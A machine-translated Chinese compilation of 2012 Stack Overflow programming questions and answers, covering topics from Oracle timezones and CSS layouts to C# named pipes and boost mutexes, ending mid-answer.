> 赞同：0
> 
> 时间：2012-12-10T17:36:28.767
> 
> 标签：transform, mule

我正在尝试创建一个 mule 流（仍在 mule 3.2 上）。我的流程必须接收入站消息，使用 xslt 节点转换消息，然后将转换后的消息发送到目的地。我遇到的问题是，目标类型和我应该发送转换后的消息的目标都在原始消息中。但是在转换之后，我无法再访问原始消息了。

关于如何解决这个问题的任何想法？

任何帮助将不胜感激！！！

谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:39:05.817

将原始消息存储在流变量（也称为调用范围的消息属性）中。您可以在转换后从那里检索它。

# sql - 如何在 oracle sql 存储过程中转换时区？

> ID：13806130
> 
> 赞同：3
> 
> 时间：2012-12-10T17:36:29.240
> 
> 标签：sql, oracle, timezone

如何在 Oracle SQL 存储过程中将日期/时间戳从一个时区转换为另一个时区？DB 服务器设置为使用 GMT，连接到 DB 的机器也是如此，但数据必须保存在 CST 或 CDT 中，具体取决于是否是夏令时。

我有这个 SQL 工作：

```
select to_char(from_tz(TO_TIMESTAMP(to_char(SYSDATE,'mm-dd-yyyy hh24:mi:ss'), 'mm-dd-yyyy hh24:mi:ss'),'GMT')  at time zone 'CST6CDT','mm-dd-yyyy hh24:mi:ss') from dual; 
```

但是当我把它放到一个程序中时，它会因为这个错误而失败：ORA-01843: not a valid month

这就是我的程序：

```
declare 
p_systemDT TIMESTAMP WITH TIME ZONE;
BEGIN
select to_char(from_tz(TO_TIMESTAMP(to_char(SYSDATE,'mm-dd-yyyy hh24:mi:ss'), 'mm-dd-yyyy hh24:mi:ss'),'GMT')  at time zone 'CST6CDT','mm-dd-yyyy hh24:mi:ss')  into p_systemDT  from dual;
DBMS_OUTPUT.PUT_LINE('p_systemDT = ' || p_systemDT);
end; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:43:23.893

首先，您可以使用`SYSTIMESTAMP`返回一个`TIMESTAMP WITH TIME ZONE`（在我的情况下，服务器在美国/东部时区运行，比格林威治标准时间晚 5 小时），因此您不必`SYSDATE`将其转换为时间戳

```
SQL> select systimestamp
  2    from dual;

SYSTIMESTAMP
---------------------------------------------------------------------------
10-DEC-12 12.39.51.755000 PM -05:00 
```

然后您可以转换`SYSTIMESTAMP`为您想要的任何时区（在这种情况下为“CST6CDT”）

```
SQL> ed
Wrote file afiedt.buf

  1  select systimestamp at time zone 'CST6CDT'
  2*   from dual
SQL> /

SYSTIMESTAMPATTIMEZONE'CST6CDT'
---------------------------------------------------------------------------
10-DEC-12 11.40.14.491000 AM CST6CDT 
```

然后如果你想指定字符串的格式，你可以添加一个`to_char`

```
SQL> ed
Wrote file afiedt.buf

  1  select to_char( systimestamp at time zone 'CST6CDT', 'mm-dd-yyyy hh24:mi:ss' )
  2*   from dual
SQL> /

TO_CHAR(SYSTIMESTAM
-------------------
12-10-2012 11:40:48 
```

# magento - 获取 Magento 以外的运费

> ID：13806138
> 
> 赞同：1
> 
> 时间：2012-12-10T17:36:43.583
> 
> 标签：magento, shipping

我正在尝试在 Magento 之外创建订单，我目前的问题是在 Magento 中创建订单之前我需要知道运费表成本。

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T21:49:58.957

有2个选项：

1.  表费率存储在`shipping_tablerate`表中。因此，知道您的计算类型（Magento 表费率有 3 个计算变量）和订单条件（重量、价格、目的地、物品数量）直接查询数据库。

2.  您可以创建报价对象，添加报价项目和地址，然后运行`Mage_Shipping_Model_Shipping::collectRatesByAddress`​​.

# asp.net-mvc - 将 Razor 标记显示为文本

> ID：13806141
> 
> 赞同：2
> 
> 时间：2012-12-10T17:37:03.153
> 
> 标签：asp.net-mvc, razor

我想在页面上显示一段 Razor 标记作为文本示例。我需要显示以下代码（例如）

```
 <div class="editor-wrap">
    <div class="editor-label">
    <text>
        @Html.LabelFor( model => model.StartDate, new { data_tooltip_message = "Some text" } )
        </text>
    </div>
</div> 
```

所以我有常规的 Html 加上 Razor 标记，我知道要显示 Html 你必须用

```
<XMP> 
```

标签，但 Razor 无论如何都在解析它的标记，并且在我希望它只显示纯文本的地方抛出异常。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:22:49.433

~~`<XMP>`实际上不推荐。喜欢`<code>`或`<pre>`喜欢的东西。或者，您可以对文本进行 HTML 编码，使其以您期望的方式呈现在页面上。~~.

**更新**：对不起，我知道你现在想做什么。该标记仅告诉浏览器停止解析 HTML，但由于 @ 字符，razor 仍会尝试解析其代码。为了解决这个问题，通过在其中放置第二个 @ 来逃避角色。

```
<xmp>
    <div class="editor-wrap">
        <div class="editor-label">
            <text>
                @@Html.LabelFor( model => model.StartDate, new { data_tooltip_message = "Some text" } )
            </text>
        </div>
    </div>
</xmp> 
```

# html - CSS在一个div中定位两列

> ID：13806143
> 
> 赞同：0
> 
> 时间：2012-12-10T17:37:05.017
> 
> 标签：html, css

我`<div>`在一个容器里有两个。它们充当左列和右列。右栏的高度会有所不同，而左栏只有一张图片和一些文字。

如何在不使用浮动和清除 div hack 的情况下正确定位这些？使用这些样式意味着我需要额外的 HTML，而且通常需要过多的 CSS。

[**jsFiddle**，其中的列根本表现不佳。它们都应该从容器 div 的顶部开始。](http://jsfiddle.net/yArWb/6/)

我假设你可以用`display: inline-block`. 但是当我这样做时，其中一列通常有奇怪的垂直定位。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:43:14.243

您仍然可以使用 float 而无需任何技巧，并且您的 HTML 标记如下：

**CSS**

```
.container {
    /* this clears the float */
    overflow: hidden;
}

.leftColumn {
    float:left;
}

.rightColumn {
    float:left;
} 
```

我只发布了已更改的部分。

演示：http: [//jsfiddle.net/NhS98/](http://jsfiddle.net/NhS98/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T17:42:21.487

### 简单修复：

给`float: left;`两者`.leftColumn`, 和`.rightColumn`。要清除浮动，`overflow: hidden;`请给`.container`.

### CSS

```
.container {overflow: hidden;}
.leftColumn, .rightColumn {float: left;} 
```

### 小提琴：http: [//jsfiddle.net/qYGeY/](http://jsfiddle.net/qYGeY/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T17:45:40.917

显示 inline-block 不起作用或无法正确对齐的原因是 inline-block 考虑了空格。

```
<div class="container"><div class="leftColumn">abc</div><div class="rightColumn">content</div></div>​ 
```

有关工作示例，请参见此处：http: [//jsfiddle.net/4Nmmq/2/](http://jsfiddle.net/4NmMq/2/)

当您有一个空格时，在这种情况下是标签，在标记前面，它会显示在浏览器中，因此它没有对齐。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-10T17:46:10.933

将 div 设为相对 div 中的绝对值，如下所示：

```
.container {
    background: rgb( 240, 240, 240);
    width: 300px;
    position:relative;
}

.leftColumn {
    display: block;
    position: absolute;
    top:0;
    left:0;
}

 .photoHolder {
    width: 40px;
    height: 50px;
    background: rgb(200, 200, 245);
}

.rightColumn {
    display: block;
    width: 250px;
    height: 400px;
    background: rgb( 200, 244, 244);
    position: absolute;
    top:0;
    right:0;
} 
```

[http://jsfiddle.net/yArWb/9/](http://jsfiddle.net/yArWb/9/) <--这是一个小提琴。​</p>

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-10T17:40:55.077

您可以使用`display: table-cell;`和`display: table;`CSS 属性来执行此操作。没有浮动。没有清算。`vertical-align:top`将确保内容保持在 div 的顶部。

**[jsFiddle 示例](http://jsfiddle.net/j08691/yArWb/7/)**

```
.container {
    background: rgb( 240, 240, 240);
    width: 300px;
    display:table;
}
.leftColumn {
    display: table-cell;
}
.photoHolder {
    width: 40px;
    height: 50px;
    background: rgb(200, 200, 245);
}
.rightColumn {
    display: table-cell;
    width: 250px;
    height: 400px;
    background: rgb( 200, 244, 244);
    vertical-align:top;
} 
```

​</p>

# jquery - MVC4 Actions 自动 json 反序列化在复杂对象中发送空值？

> ID：13806145
> 
> 赞同：0
> 
> 时间：2012-12-10T17:37:19.547
> 
> 标签：jquery, asp.net-mvc-4

我使用手动序列化/反序列化对我的控制器操作进行了示例 jquery 调用。我可以很好地来回发送一个复杂的对象。但是使用“自动”反序列化的相同代码仅发送对象的外部部分，但内部为空。

这是一个错误吗？..我认为太大了，我应该配置一些东西来告诉 MVC“请按预期做”吗？这是我的有效代码，我的无效代码。

有效的代码： Javascript: var modelListData = { "listname": "xname", "samplemodels": [{ "name": "pepe1" }, { "name": "pepe2" }, { "name": "pepe3 " }, { "name": "pepe4" }]};

```
$.ajax({
    url: "http://localhost:1629/Sample/MyTestMethod5",
    method: 'POST',
    data: { "sampleModelListJson": JSON.stringify(modelListData) },
    success: processGetJSONList,
    error: function (data) { alert("error" + data); }
}); 
```

控制器动作：

```
 public ActionResult MyTestMethod5(string sampleModelListJson)
    {
        SampleModelList inputModelList = JsonConvert.DeserializeObject<SampleModelList>(sampleModelListJson);
        SampleModelList outputModelList = new SampleModelList();
        outputModelList.listname = inputModelList.listname + "xxx";
        outputModelList.samplemodels = inputModelList.samplemodels;
        return Json(outputModelList, JsonRequestBehavior.AllowGet);
    } 
```

不起作用的代码：

Javascript：

```
$.ajax({
    url: "http://localhost:1629/Sample/MyTestMethod6",
    method: 'POST',
    data: modelListData,  //reusing previous one
    success: processGetJSONList,
    error: function (data) { alert("error" + data); }
}); 
```

控制器动作：

```
 public ActionResult MyTestMethod6(SampleModelList sampleModelList)
    {
        SampleModelList outputModelList = new SampleModelList();
        outputModelList.listname = sampleModelList.listname + "xxx";
        outputModelList.samplemodels = sampleModelList.samplemodels;
        return Json(outputModelList, JsonRequestBehavior.AllowGet);
    } 
```

# php - 使用 cURL 没有来自 XML 的响应

> ID：13806146
> 
> 赞同：2
> 
> 时间：2012-12-10T17:37:24.030
> 
> 标签：php, xml, api, curl

我正在使用一个简单的 cURL 语句来解析我网站上的 XML。当 API 启动并工作时，它工作正常，但是一旦 API 由于任何原因关闭，整个站点就会崩溃。

```
$url = 'http://www.mydomain.com/webservicexample';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
curl_close($ch); 

$xml = new SimpleXmlElement($data); 
```

是否有一个条件我可以放在 url 周围，以便它只在 API 有积极响应时执行 cURL 脚本？我尝试了以下方法，但没有成功，因为它从未得到服务器响应来提供任何标头：

```
$url_headers = @get_headers($url);
if($url_headers[0] == 'HTTP/1.1 200 OK') {

    // do script
} 
```

非常感谢任何帮助/建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:55:30.747

您可以检查的返回值`curl_exec()`：

```
if (false === ($data = curl_exec($ch))) {
    die("Eek! Curl error! " . curl_error($ch));
} 
```

并检查响应头：

```
if (200 !== (int)curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
    die("Oh dear, no 200 OK?!");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T09:04:32.803

最后，我能够通过使用 CURLOPT_TIMEOUT 和 CURLOPT_CONNECTTIMEOUT 设置超时时间来使其正常工作，然后使用 curl_errno() 在其周围设置条件。

```
$ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $data = curl_exec($ch);

    if(!curl_errno($ch))
    {
        curl_close($ch); 
        $xml = new SimpleXmlElement($data);
        return $xml;
    } 
```

# javascript - 在 Firefox 或 chrome 中使用 javascript 访问文件系统？

> ID：13806148
> 
> 赞同：1
> 
> 时间：2012-12-10T17:37:25.793
> 
> 标签：javascript, security, google-chrome, firefox

在 Firefox 15 之前，我一直能够做到这一点，使用：

`netscape.security.privilegeManager.enablePrivilege("UniversalXPConnect")`

并将`signed.applets.codebase_principal_support`选项设置为`true`. 不幸的是，从 FF 17 开始，此功能已被删除。据我了解，Chrome 已经有一段时间了。

有谁知道是否创建了允许使用的 Firefox 或 Chrome 扩展程序`enablePrivilege`？如果没有，如果我自己构建，建议从哪里开始？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:00:09.800

[File API](http://www.w3.org/TR/FileAPI/)，它们停止工作的原因是因为两者现在都实现了 html5 文件 api。

这是[api 的 html5 演示](http://html5demos.com/file-api)。

以下是相关脚本，以防他们删除演示：

```
<script>
var holder = document.getElementById('holder'),
state = document.getElementById('status');

if (typeof window.FileReader === 'undefined') {
 state.className = 'fail';
} else {
 state.className = 'success';
 state.innerHTML = 'File API & FileReader available';
}

holder.ondragover = function () { this.className = 'hover'; return false; };
holder.ondragend = function () { this.className = ''; return false; };
holder.ondrop = function (e) {
this.className = '';
e.preventDefault();

 var file = e.dataTransfer.files[0],
 reader = new FileReader();
 reader.onload = function (event) {
    console.log(event.target);
    holder.style.background = 'url(' + event.target.result + ') no-repeat center';
 };
 console.log(file);
 reader.readAsDataURL(file);

 return false;
};
</script> 
```

注意：如果您需要在 chrome 中访问本地计算机上的文件，则需要使用此开关运行程序`--allow-file-access-from-files`（使用文件输入而不实际加载到服务器，否则会出现 xhr 跨域错误） .

我不知道Firefox中的等价物。

# ios - iOS6 试图从 UIView 创建 UITabBarController

> ID：13806151
> 
> 赞同：0
> 
> 时间：2012-12-10T17:37:39.760
> 
> 标签：ios, tabbar

我正在尝试从 UIViewController 以编程方式创建 UITabBar。我目前正在使用这个算法。然而，我遇到了一个问题。谁能告诉我我缺少什么？

```
-(void)loadView{
    UIView *contentView = [[UIView alloc] initWithFrame:[[UIScreen mainScreen] applicationFrame]];
    contentView.backgroundColor = [UIColor whiteColor];
    self.view = contentView;

    TabControllerHelper *tabControllerHelper = [[TabControllerHelper alloc]initWithNibName:@"TabControllerHelper" bundle:[NSBundle mainBundle]];
    tabControllerHelper.title = @"First";

    TabControllerHelper *tabControllerHelper1 = [[TabControllerHelper alloc]initWithNibName:@"TabControllerHelper" bundle:nil];
    tabControllerHelper1.title = @"Second";

    //dvdInfoController.tabBarItem.image = [UIImage imageNamed:@"dvdicon.png"];
    UITabBarController *tabBarController = [[UITabBarController alloc] init];
    tabBarController.view.frame = CGRectMake(0, 0, 320, 460);

    // Set each tab to show an appropriate view controller
    [tabBarController setViewControllers:[NSArray arrayWithObjects:tabControllerHelper, tabControllerHelper1, nil]];
    [self.view addSubview:tabBarController.view];

} 
```

我收到的错误：

```
2012-12-11 01:34:27.581 SampleUITabView[7134:c07] -[__NSCFType _tabBarItemClicked:]: unrecognized selector sent to instance 0x7574230
2012-12-11 01:34:27.582 SampleUITabView[7134:c07] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSCFType _tabBarItemClicked:]: unrecognized selector sent to instance 0x7574230'
*** First throw call stack: 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:49:49.590

你正在做一些“ViewController Containment”的事情。一种方法可能是不理会 loadView 并让它做基本的事情。

并在 viewDidLoad 中执行视图控制器包含，如

self addChildController ... self.view addSubview:... childController didMoveToParent ...

因为只需将标签栏控制器视图添加为子视图，您不一定会获得标签栏控制器的行为。

# c# - 命名管道示例

> ID：13806153
> 
> 赞同：145
> 
> 时间：2012-12-10T17:37:57.733
> 
> 标签：c#, ipc, named-pipes

我如何编写一个简单的——它工作所需的最低限度——测试说明如何使用 IPC/命名管道的应用程序？

例如，如何编写一个控制台应用程序，其中程序 1 对程序 2 说“Hello World”，程序 2 接收消息并向程序 1 回复“Roger That”。

* * *

## 回答 #1

> 赞同：186
> 
> 时间：2012-12-10T18:16:39.723

```
using System;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            StartServer();
            Task.Delay(1000).Wait();

            //Client
            var client = new NamedPipeClientStream("PipesOfPiece");
            client.Connect();
            StreamReader reader = new StreamReader(client);
            StreamWriter writer = new StreamWriter(client);

            while (true)
            {
                string input = Console.ReadLine();
                if (String.IsNullOrEmpty(input)) break;
                writer.WriteLine(input);
                writer.Flush();
                Console.WriteLine(reader.ReadLine());
            }
        }

        static void StartServer()
        {
            Task.Factory.StartNew(() =>
            {
                var server = new NamedPipeServerStream("PipesOfPiece");
                server.WaitForConnection();
                StreamReader reader = new StreamReader(server);
                StreamWriter writer = new StreamWriter(server);
                while (true)
                {
                    var line = reader.ReadLine();
                    writer.WriteLine(String.Join("", line.Reverse()));
                    writer.Flush();
                }
            });
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2015-11-07T11:24:18.677

对于不熟悉 IPC 和命名管道的人，我发现以下 NuGet 包对我有很大帮助。

[GitHub：.NET 4.0 的命名管道包装器](https://github.com/acdvorak/named-pipe-wrapper)

要使用首先安装软件包：

```
PS> Install-Package NamedPipeWrapper 
```

然后是一个示例服务器（从链接复制）：

```
var server = new NamedPipeServer<SomeClass>("MyServerPipe");
server.ClientConnected += delegate(NamedPipeConnection<SomeClass> conn)
    {
        Console.WriteLine("Client {0} is now connected!", conn.Id);
        conn.PushMessage(new SomeClass { Text: "Welcome!" });
    };

server.ClientMessage += delegate(NamedPipeConnection<SomeClass> conn, SomeClass message)
    {
        Console.WriteLine("Client {0} says: {1}", conn.Id, message.Text);
    };

server.Start(); 
```

示例客户端：

```
var client = new NamedPipeClient<SomeClass>("MyServerPipe");
client.ServerMessage += delegate(NamedPipeConnection<SomeClass> conn, SomeClass message)
    {
        Console.WriteLine("Server says: {0}", message.Text);
    };

client.Start(); 
```

对我来说最好的事情是，与这里接受的答案不同，它支持多个客户端与单个服务器通信。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2016-06-14T20:43:04.050

您实际上可以使用命名管道的名称写入命名管道，顺便说一句。

以管理员身份打开命令 shell 以绕过默认的“访问被拒绝”错误：

```
echo Hello > \\.\pipe\PipeName 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2018-03-14T15:32:04.067

> **Linux dotnet 核心不支持命名管道！**

*如果您部署到 Linux，请尝试 TcpListener*

此 NamedPipe 客户端/服务器代码将一个字节往返传输到服务器。

*   客户端写入字节
*   服务器读取字节
*   服务器写入字节
*   客户端读取字节

DotNet Core 2.0 服务器 ConsoleApp

```
using System;
using System.IO.Pipes;
using System.Threading.Tasks;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            var server = new NamedPipeServerStream("A", PipeDirection.InOut);
            server.WaitForConnection();

            for (int i =0; i < 10000; i++)
            {
                var b = new byte[1];
                server.Read(b, 0, 1); 
                Console.WriteLine("Read Byte:" + b[0]);
                server.Write(b, 0, 1);
            }
        }
    }
} 
```

DotNet Core 2.0 客户端 ConsoleApp

```
using System;
using System.IO.Pipes;
using System.Threading.Tasks;

namespace Client
{
    class Program
    {
        public static int threadcounter = 1;
        public static NamedPipeClientStream client;

        static void Main(string[] args)
        {
            client = new NamedPipeClientStream(".", "A", PipeDirection.InOut, PipeOptions.Asynchronous);
            client.Connect();

            var t1 = new System.Threading.Thread(StartSend);
            var t2 = new System.Threading.Thread(StartSend);

            t1.Start();
            t2.Start(); 
        }

        public static void StartSend()
        {
            int thisThread = threadcounter;
            threadcounter++;

            StartReadingAsync(client);

            for (int i = 0; i < 10000; i++)
            {
                var buf = new byte[1];
                buf[0] = (byte)i;
                client.WriteAsync(buf, 0, 1);

                Console.WriteLine($@"Thread{thisThread} Wrote: {buf[0]}");
            }
        }

        public static async Task StartReadingAsync(NamedPipeClientStream pipe)
        {
            var bufferLength = 1; 
            byte[] pBuffer = new byte[bufferLength];

            await pipe.ReadAsync(pBuffer, 0, bufferLength).ContinueWith(async c =>
            {
                Console.WriteLine($@"read data {pBuffer[0]}");
                await StartReadingAsync(pipe); // read the next data <-- 
            });
        }
    }
} 
```

# mysql - 将电子邮件发送到以 php 表单提交的电子邮件

> ID：13806154
> 
> 赞同：0
> 
> 时间：2012-12-10T17:38:00.843
> 
> 标签：mysql, email, php

如果有人在使用 php 发送邮件时能指出正确的方向，我将不胜感激。我有这个比赛表格[http://www.beogradstore.com/mn/contest/main-contest/](http://www.beogradstore.com/mn/contest/main-contest/)我希望我的参赛者在参加比赛时以及通过推荐链接收到新参赛作品时收到电子邮件通知。条目存储在 SQL 表中。

实现这一目标的最佳方法是什么？是使用php邮件功能还是其他？任何援助将不胜感激。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:44:41.793

我会使用 PHP`mail()`函数。下面是 HTML 电子邮件的示例：

```
 $subject = "Subject";
    $msg = '
    <html>
    <body>
    <p>HTML email here</p>
    </body>
    </html>
    ';
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: Their Name <info@theirdomain.com>' . "\r\n";
    $email = 'info@yourdomain.com';
    if(!mail($email, $subject, $msg, $headers)) {
        // Show error
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:43:12.187

使用内置`mail()`函数从您的 PHP 应用程序发送电子邮件。

对于更高级的用例，包括附件、HTML 电子邮件、通过 Gmail 发送等，您可以使用 PHPMailer 之类的库：

[http://code.google.com/a/apache-extras.org/p/phpmailer/](http://code.google.com/a/apache-extras.org/p/phpmailer/)

# php - 尝试将表单数据存储在文本文件中时，我的 debian linux 服务器中的 lighttpd 服务器出现 403 错误。我该如何解决这个问题

> ID：13806159
> 
> 赞同：0
> 
> 时间：2012-12-10T17:38:21.120
> 
> 标签：php, http-status-code-403

我创建了一个 html 表单并尝试使用 PHP 将其存储在文本文件中，但我一直收到 403 错误。这很可能是因为它没有写权限。如何授予脚本在目录中写入的权限？（我使用的是 Raspbian Wheezy 发行版）

```
 <form method="POST" action="store.php">
    Enter Your Name: <input type="text" name="fullname" />
    </form> 
```

和服务器

```
 <?php
    foreach($_POST as $name=>$value)
   {
        $contents .= "$name = $value" . "\n";
    }

    // save locally in cache folder
    $fd = fopen("cache/filename.txt", "w");
    fwrite($fd, $contents);
    fclose($fd);

    die();
    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:34:43.087

`403`您收到的可能与实际的 PHP 代码本身无关。作为一般规则，PHP 中的错误会生成`5xx`状态码，而不是`4xx`.

您是否确保网络服务器帐户对您的 PHP 文件具有执行权限？

# matlab - 字符串匹配两个字符元胞数组并输出索引

> ID：13806162
> 
> 赞同：1
> 
> 时间：2012-12-10T17:38:29.547
> 
> 标签：matlab

如何从字符元胞数组中获取错误分类标签的索引。例如：

```
pred = tt.eval(test_data); 
```

我可以使用混淆矩阵：

```
cm = confusionmat(test_class,pred) 
```

但是，我需要`pred`. 只是一个错误的行号的输出，基于`test_class`.

pred 和`test_class`都是字符元胞数组。

例如：

```
Pred:

1\. Normal
2\. Normal
3\. Normal

test_class:

1\. Normal
2\. Normal
3\. Abnormal 
```

输出应该是 Pred 错误分类的行：

3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:50:27.640

如果我理解正确，您有两个包含要比较的字符串的元胞数组？

[strcmp](http://www.mathworks.nl/help/matlab/ref/strcmp.html)会很好地完成工作：

```
pred = {'Normal' ; 'Normal' ; 'Normal'};
test_class = {'Normal' ; 'Normal' ; 'Abnormal'};

>> ~strcmp(pred,test_class)

ans =

     0
     0
     1 
```

如果你想要索引号，你可以在前面的结果中使用[find ：](http://www.mathworks.nl/help/matlab/ref/find.html)

```
>>find(~strcmp(pred,test_class))

ans =

     3 
```

# ruby-on-rails-3.2 - 在我现有的 rails 3.2 应用程序中添加引导 gem 的快速方法是什么？

> ID：13806167
> 
> 赞同：0
> 
> 时间：2012-12-10T17:38:57.057
> 
> 标签：ruby-on-rails-3.2

*   我正在处理一些“更少”的问题。

*   gem 说它应该处理处理“less”编译的依赖项，但它会给出错误，因为它没有解释“less”

*   我知道 Rails 很实用，所以有人可以告诉我工作流程有多简单吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:41:32.317

Ryan Bates 有一个很棒的教程，介绍了将引导程序包含到 Rails 应用程序[Link](http://railscasts.com/episodes/328-twitter-bootstrap-basics)中。你也可以只包括 bootstrap sass

```
gem 'bootstrap-sass'
bundle install 
```

# ruby-on-rails - 在 Rails 中使用多个 belongs_to 创建或更新的正确方法

> ID：13806170
> 
> 赞同：0
> 
> 时间：2012-12-10T17:39:01.873
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, activerecord, idioms

*刚接触 Rails 和 Ruby 并尝试正确地*做事。

这是我的模型。一切正常，但我想以“正确”的方式做事。我有一个导入过程，它采用 CSV 并尝试创建新记录或更新现有记录。

所以过程是 1.) 解析 csv 行 2.) 查找或创建记录 3.) 保存记录

我有这个完美的工作，但代码似乎可以改进。如果不涉及 ParcelType 那就没问题了，因为我正在从制造商创建/检索一个包裹，所以该外键已为我预先填充。但是 ParcelType 不是。无论如何都要预先填充类型和制造商，因为我在搜索中都使用它们？

CSV 行每行可以有多个制造商（导致 2 个几乎相同的行，只是使用 diff mfr_id）所以这就是 .each 的意义所在

```
manufacturer_id.split(";").each do |mfr_string|
  mfr = Manufacturer.find_by_name(mfr_string)

  # If it's a mfr we don't care about, don't put it in the db
  next if mfr.nil?

  # Unique parcel is defined by it's manufacturer, it's type, it's model number, and it's reference_number
  parcel = mfr.parcels.of_type('FR').find_or_initialize_by_model_number_and_reference_number(attributes[:model_number], attributes[:reference_number])
  parcel.assign_attributes(attributes)

  # this line in particular is a bummer. if it finds a parcel and I'm updating, this line is superfulous, only necessary when it's a new parcel
  parcel.parcel_type = ParcelType.find_by_code('FR')

  parcel.save!
end

class Parcel < ActiveRecord::Base
  belongs_to :parcel_type
  belongs_to :manufacturer

  def self.of_type(type)
    joins(:parcel_type).where(:parcel_types => {:code => type.upcase}).readonly(false) unless type.nil?
  end
end

class Manufacturer < ActiveRecord::Base
  has_many :parcels
end

class ParcelType < ActiveRecord::Base
  has_many :parcels
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:07:27.287

听起来像[new_record？](http://apidock.com/rails/ActiveRecord/Base/new_record%3F)方法就是你要找的。

> **new_record?() 公开的**
> 
> 如果此对象尚未保存，则返回 true ——也就是说，该对象的记录尚不存在；否则，返回 false。

只有当包裹对象确实是新记录时，才会执行以下操作：

```
parcel.parcel_type = ParcelType.find_by_code('FR') if parcel.new_record? 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T20:04:09.673

'find_or_create' 呢？我很早就想使用它，请检查这些链接。

*   用法：
    [http ://rubyquicktips.com/post/344181578/find-or-create-an-object-in-one-command](http://rubyquicktips.com/post/344181578/find-or-create-an-object-in-one-command)
*   几个属性：
    [Rails find_or_create 由多个属性组成？](https://stackoverflow.com/questions/3046607/rails-find-or-create-by-more-than-one-attribute)
*   额外：
    [如何在 Rails 3 中将多个属性传递给 find_or_create_by？](https://stackoverflow.com/questions/3997034/how-can-i-pass-multiple-attributes-to-find-or-create-by-in-rails-3)

# c++ - 在同一线程上增强互斥锁

> ID：13806176
> 
> 赞同：4
> 
> 时间：2012-12-10T17:39:33.863
> 
> 标签：c++, boost, lua, mutex

我是 boost 库的新手，这是一个非常棒的库！另外，我是互斥锁的新手，如果我犯了新手错误，请原谅我。

无论如何，我有两个函数叫做`FunctionOne`and `FunctionTwo`。`FunctionOne`并由`FunctionTwo`不同的线程异步调用。所以这就是发生的事情：在`FunctionOne`中，我在函数的开头锁定了一个全局互斥锁，并在函数的末尾解锁了全局互斥锁。同样的事情`FunctionTwo`。

现在问题来了：有时，`FunctionOne`并且`FunctionTwo`相隔不到几毫秒的时间被调用（但并非总是如此）。因此，`FunctionOne`开始执行并执行到一半`FunctionTwo`。当锁定互斥锁时，`FunctionTwo` 整个线程都停止了，所以中途卡住了，线程永远等待自己。所以，总结一下：`FunctionOne``FunctionTwo``FunctionOne``FunctionTwo`

*   函数 1 锁定互斥体并开始执行代码。
*   函数 2 在几毫秒后被调用并锁定互斥锁，冻结线程 func 1 和 2 正在运行。
*   现在 func 1 卡在中途并且线程被冻结，所以 func 1 永远不会完成并且互斥锁被永远锁定，等待 func 1 完成。

在这种情况下怎么办？这是我的代码：

```
boost::mutex g_Mutex;
lua_State* L;

// Function 1 is called from some other thread
void FunctionOne()
{
    g_Mutex.lock();

    lua_performcalc(L);

    g_Mutex.unlock();
}

// Function 2 is called from some other thread a few ms later, freezing the thread
// and Function 1 never finishes
void FunctionTwo()
{
    g_Mutex.lock();

    lua_performothercalc(L);

    g_Mutex.unlock();
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T17:46:22.530

这些函数是否旨在可重入，以便 FunctionOne 在持有互斥锁的同时调用自身或 FunctionTwo？反之亦然，FunctionTwo 锁定互斥锁，然后在互斥锁被锁定时调用 FunctionOne/FunctionTwo？

*   如果不是，那么您不应该从同一个线程调用这两个函数。如果您打算将 FunctionTwo 阻塞直到 FunctionOne 完成，那么在同一个线程上调用它是错误的。如果 lua_performcalc 最终调用 FunctionTwo，就会发生这种情况。这是在同一线程上调用它们的唯一方法。

*   如果是这样，那么您需要一个[recursive_mutex](http://www.boost.org/doc/libs/1_41_0/doc/html/thread/synchronization.html#thread.synchronization.mutex_types.recursive_mutex)。一个普通的互斥锁只能被锁定一次；从同一个线程再次锁定它是一个错误。一个递归互斥锁可以被单个线程多次锁定，并且一直被锁定直到线程调用解锁相同次数。

在任何一种情况下，您都应该避免显式调用 lock 和 unlock。如果抛出异常，互斥锁将不会被解锁。最好使用 RAII 样式的锁定，如下所示：

```
{
    boost::recursive_mutex::scoped_lock lock(mutex);

    ...critical section code...

